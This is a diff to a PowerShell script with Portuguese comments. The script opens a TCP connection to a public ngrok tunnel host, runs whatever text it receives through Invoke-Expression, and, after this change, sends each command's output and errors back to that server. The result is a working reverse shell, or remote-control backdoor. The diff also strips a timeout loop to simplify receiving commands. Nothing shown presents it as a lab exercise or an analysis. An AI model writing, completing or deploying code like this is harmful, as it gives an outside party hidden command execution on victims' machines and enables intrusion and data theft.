@@ -28,7 +28,8 @@ function Receber-Dados {
 
 function Processar-Mensagem {
     param (
-        [string]$mensagemCompleta
+        [string]$mensagemCompleta,
+        [System.IO.Stream]$stream
     )
 
     Write-Host "Mensagem recebida (antes de executar): '$mensagemCompleta'"
@@ -38,8 +39,16 @@ function Processar-Mensagem {
             # Executa a mensagem como comando
             Write-Host "Executando comando: $mensagemCompleta"
             $resultado = Invoke-Expression $mensagemCompleta
-            Write-Host "Resultado do comando: $resultado"
+
+            # Envia o resultado de volta para o servidor
+            $writer = New-Object System.IO.StreamWriter($stream)
+            $writer.AutoFlush = $true
+            $writer.WriteLine($resultado)
+            Write-Host "Resultado do comando enviado de volta para o servidor: $resultado"
         } catch {
+            $writer = New-Object System.IO.StreamWriter($stream)
+            $writer.AutoFlush = $true
+            $writer.WriteLine("Erro ao executar o comando: $_")
             Write-Host "Erro ao executar o comando: $_"
         }
     } else {
@@ -54,7 +63,7 @@ try {
 
     # Conecta ao servidor
     $servidor = "0.tcp.sa.ngrok.io"
-    $port = 16312 
+    $port = 16312
     try {
         Write-Host "Conectando ao servidor $servidor na porta $port..."
         $socket.Connect($servidor, $port)
@@ -77,61 +86,24 @@ try {
 
     # Buffer para armazenar dados recebidos
     $buffer = New-Object System.Text.StringBuilder
-    $timeout = 5000  # Tempo máximo de espera por dados em milissegundos
-    $minBytesToReceive = 1024  # Número mínimo de bytes a serem verificados
 
     # Loop para receber mensagens e executar comandos
     while ($true) {
         try {
-            $startTime = [System.Diagnostics.Stopwatch]::GetTimestamp()
-            $dataAvailable = $false
+            Receber-Dados -stream $stream -buffer $buffer
 
-            # Verifica se há dados disponíveis maiores que o número mínimo
-            Write-Host "Verificando se há dados maiores que $minBytesToReceive bytes..."
-            if ($stream.DataAvailable) {
-                Write-Host "Dados disponíveis no stream. Lendo bytes..."
-                Receber-Dados -stream $stream -buffer $buffer
-                $dataAvailable = $true
+            if ($buffer.Length -gt 0) {
+                # Processa a mensagem
+                $mensagemCompleta = $buffer.ToString().Trim()
+                Write-Host "Mensagem recebida completa: $mensagemCompleta"
+                $buffer.Clear()
+
+                # Processa a mensagem
+                Write-Host "Iniciando execução do comando..."
+                Processar-Mensagem -mensagemCompleta $mensagemCompleta -stream $stream
             }
 
-            # Verifica o tempo limite
-            Write-Host "Iniciando verificação de tempo limite..."
-            while ($true) {
-                $currentTime = [System.Diagnostics.Stopwatch]::GetTimestamp()
-                $elapsed = ([System.Diagnostics.Stopwatch]::GetTimestamp() - $startTime) / [System.Diagnostics.Stopwatch]::Frequency * 1000
-
-                if ($elapsed -ge $timeout) {
-                    # Tempo limite atingido
-                    Write-Host "Tempo limite alcançado. Nenhum dado recebido."
-                    break
-                }
-
-                if ($stream.DataAvailable) {
-                    Write-Host "Dados disponíveis no stream. Lendo bytes..."
-                    $dataAvailable = $true
-                    Receber-Dados -stream $stream -buffer $buffer
-                }
-
-                # Verifica se o servidor foi desconectado
-                if (!$socket.Connected) {
-                    Write-Host "Servidor desconectado."
-                    break
-                }
-
-                Start-Sleep -Milliseconds 100
-            }
-
-            if ($dataAvailable -or $buffer.Length -gt 0) {
-                # Processa o buffer atual
-                if ($buffer.Length -gt 0) {
-                    $mensagemCompleta = $buffer.ToString().Trim()
-                    Write-Host "Mensagem recebida completa: $mensagemCompleta"
-                    $buffer.Clear()
-
-                    # Processa a mensagem
-                    Processar-Mensagem -mensagemCompleta $mensagemCompleta
-                }
-            }
+            Start-Sleep -Milliseconds 100
 
         } catch {
             Write-Host "Erro na leitura dos bytes: $_"
